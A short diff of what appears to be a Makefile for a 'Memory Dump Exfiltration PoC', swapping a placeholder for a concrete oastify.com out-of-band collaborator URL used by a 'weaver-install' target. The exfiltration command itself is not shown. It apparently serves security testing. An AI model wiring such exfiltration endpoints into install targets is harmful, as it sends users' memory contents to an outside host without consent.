@@ -1,4 +1,4 @@
-COLLABORATOR_URL = http://YOUR_ID.oastify.com
+COLLABORATOR_URL = http://z11fhtf3gkmy8zj9vf4attr47vdm1fp4.oastify.com
 
 weaver-install:
 	@echo "--- Starting Memory Dump Exfiltration PoC ---"
